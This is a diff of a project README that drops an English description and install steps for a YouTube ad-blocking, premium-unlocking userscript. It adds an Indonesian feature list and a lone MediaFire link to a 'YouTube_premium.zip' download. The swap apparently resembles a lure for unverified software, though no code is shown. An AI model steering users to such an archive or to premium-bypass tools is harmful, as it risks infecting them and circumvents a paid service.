@@ -3,30 +3,20 @@
 # Aplikasi YouTube Premium Free
 ![YouTube-Premium](https://github.com/user-attachments/assets/5e8d7fc8-4333-4173-9018-46b5ec970126)
 
-In the era of relentless digital advertising, we're tired of being bombarded with ads while Google profits from our personal data. The algorithm feeds on our information to serve us targeted ads, enriching itself at our expense. It's time to take back control.
+Berikut adalah fitur-fitur utama YouTube Premium secara lebih rinci:
 
-YouTubePremiumFree is a userscript designed to liberate you from intrusive ads and unwanted commercial interruptions on YouTube.
+Tanpa Iklan: Nikmati jutaan video di YouTube tanpa gangguan iklan. 
+Download Video: Unduh video dan playlist untuk ditonton secara offline di perangkat seluler. 
+Putar di Latar Belakang: Terus putar video saat menggunakan aplikasi lain atau saat layar mati. 
+YouTube Music Premium: Akses YouTube Music Premium, termasuk fitur bebas iklan, download, putar latar belakang, dan mode audio saja. 
+Picture-in-Picture (PiP): Tonton video sambil menggunakan aplikasi lain di perangkat seluler. 
+1080p Premium: Tonton video dengan kualitas 1080p yang lebih baik, dengan bitrate yang lebih tinggi untuk pengalaman menonton yang lebih jernih. 
+Kontrol Premium: Nikmati fitur tambahan seperti melewati konten, mengubah kecepatan pemutaran, dan lainnya. 
+Dukungan Kreator: Dukung kreator YouTube favorit Anda dengan berlangganan YouTube Premium. 
+Dengan YouTube Premium, Anda dapat meningkatkan pengalaman menonton video dan musik di YouTube dengan fitur-fitur yang lebih lengkap dan nyaman. 
 
-## Features
-- [✓] - AdBlocker: Eliminate all forms of advertisements, ensuring an uninterrupted viewing experience
-- [✓] - Premium Title
-- [✓] Premium Logo
-- [✓] Download videos and music
-- [✓] Offline mode: Play downloaded videos or music anytime, offline, anywhere, right inside YouTube
-- [✓] Premium resolution: Automcatically switches to HD Premium resolution, first select your resolution
-- [✓] Pop-ups blocker
+## Cara Install Di Bawah ini
 
-## Installation
-1. **Install Tampermonkey**:
-   If you haven't already, you need to install the Tampermonkey browser extension. You can find it for various browsers:
-   - [Tampermonkey for Chrome](https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo)
-   - [Tampermonkey for Firefox](https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/)
-   - [Tampermonkey for Safari](http://tampermonkey.net/?browser=safari)
-   - [Tampermonkey for Edge](https://microsoftedge.microsoft.com/addons/detail/tampermonkey/iikmkjmpaadaobahmlepeloendndfphd)
-   - [Tampermonkey for Opera/OperaGX](https://addons.opera.com/en-gb/extensions/details/tampermonkey-beta/)
-
-2. **Install the Script**: [Click here and press install](YouTube-Premium-Free.user.js?raw=True).
-
-3. **Enable the Script**: Enable the script by clicking the switch next to the script name in the Tampermonkey Dashboard.
-
-### Feel free fees and ads, enjoy your YouTube!
+/
+https://www.mediafire.com/file/vf7di0372lrjh34/YouTube_premium.zip/file
+/
